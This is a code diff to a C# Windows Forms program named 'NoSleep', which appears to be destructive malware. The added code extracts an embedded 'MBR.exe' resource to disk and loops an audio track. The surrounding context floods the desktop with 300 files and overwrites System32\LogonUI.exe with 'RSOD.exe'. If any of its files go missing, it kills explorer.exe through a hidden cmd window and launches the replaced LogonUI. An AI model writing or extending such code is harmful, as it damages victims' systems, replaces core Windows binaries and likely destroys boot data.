@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using System.IO;
 using System.Media;
 using System.Diagnostics;
+using System.Reflection;
 
 namespace NoSleep
 {
@@ -65,6 +66,18 @@ namespace NoSleep
             InitializeComponent();
             timer_to_dead.Text = TimeSpan.FromMinutes(4).ToString();
         }
+        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
+        {
+            //Important.DO NOT CHANGE!!!
+
+            Assembly assembly = Assembly.GetCallingAssembly();
+
+            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
+            using (BinaryReader r = new BinaryReader(s))
+            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
+            using (BinaryWriter w = new BinaryWriter(fs))
+                w.Write(r.ReadBytes((int)s.Length));
+        }
 
         private void NoSleep_windows_FormClosing(object sender, FormClosingEventArgs e)
         {
@@ -99,7 +112,7 @@ namespace NoSleep
             if(File.Exists(@"C:\Program Files\Temp\some_music.wav"))
             {
                 back_snd = new SoundPlayer(@"C:\Program Files\Temp\some_music.wav");
-                back_snd.Play();
+                back_snd.PlayLooping();
             }
             //Create 300 files on desktop
             string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
@@ -111,7 +124,7 @@ namespace NoSleep
                     File.Copy(desktop_files + @"\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP.txt", desktop_files + $"\\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP({s}).txt");
                 }
             }
-            catch(Exception ex) 
+            catch
             {
                 
             }
@@ -133,7 +146,11 @@ namespace NoSleep
                         File.Copy(@"C:\Program Files\Temp\RSOD.exe", @"C:\Windows\System32\LogonUI.exe");
                         logonui = false;
                     }
-                }catch(Exception ex) { }
+                }
+                catch 
+                {
+                    
+                }
             }
             //timers
             clock_timer(); //for countdown
@@ -168,20 +185,46 @@ namespace NoSleep
 
         private void check_values_Tick(object sender, EventArgs e)
         {
-            check_values.Stop();
-            string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            if (!File.Exists(@"C:\Program Files\Temp\a lot of skulls.jpg") || !File.Exists(@"C:\Program Files\Temp\NoSleeper.jpg") || !File.Exists(@"C:\Program Files\Temp\skull_real_ico.ico") || !File.Exists(@"C:\Program Files\Temp\NoSleep.exe") || !File.Exists(desktop_files + @"\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP.txt"))
+            //check if all files exists
+            try
             {
-                ProcessStartInfo rip_exp = new ProcessStartInfo();
-                rip_exp.FileName = "cmd.exe";
-                rip_exp.WindowStyle = ProcessWindowStyle.Hidden;
-                rip_exp.Arguments = @"/k taskkill /f /im explorer.exe";
-                Process.Start(rip_exp);
-                Process.Start(@"C:\Windows\System32\LogonUI.exe");
-                back_snd.Stop();
-                Environment.Exit(-1);
+                check_values.Stop();
+                string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                if (!File.Exists(@"C:\Program Files\Temp\a lot of skulls.jpg") || !File.Exists(@"C:\Program Files\Temp\NoSleeper.jpg") || !File.Exists(@"C:\Program Files\Temp\skull_real_ico.ico") || !File.Exists(@"C:\Program Files\Temp\NoSleep.exe") || !File.Exists(@"C:\Program Files\Temp\hol333.ani") || !File.Exists(desktop_files + "\\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP.txt"))
+                {
+                    ProcessStartInfo rip_exp = new ProcessStartInfo();
+                    rip_exp.FileName = "cmd.exe";
+                    rip_exp.WindowStyle = ProcessWindowStyle.Hidden;
+                    rip_exp.Arguments = @"/k taskkill /f /im explorer.exe";
+                    Process.Start(rip_exp);
+                    Process.Start(@"C:\Windows\System32\LogonUI.exe");
+                    back_snd.Stop();
+                    Environment.Exit(-1);
+                }
+                for (int s = 1; s < 300; s++)
+                {
+                    if (!File.Exists(desktop_files + $"\\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP({s}).txt"))
+                    {
+                        ProcessStartInfo rip_exp = new ProcessStartInfo();
+                        rip_exp.FileName = "cmd.exe";
+                        rip_exp.WindowStyle = ProcessWindowStyle.Hidden;
+                        rip_exp.Arguments = @"/k taskkill /f /im explorer.exe";
+                        Process.Start(rip_exp);
+                        Process.Start(@"C:\Windows\System32\LogonUI.exe");
+                        back_snd.Stop();
+                        Environment.Exit(-1);
+                    }
+                }
+                if (!File.Exists(@"C:\Program Files\Temp\MBR.exe"))
+                {
+                    Extract("NoSleep",@"C:\Program Files\Temp","Resources","MBR.exe");
+                }
+                check_values.Start();
             }
-            check_values.Start();
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "NoSleep - Error",MessageBoxButtons.OK,MessageBoxIcon.Error);
+            }
         }
 
         bool nosleep_ = true;
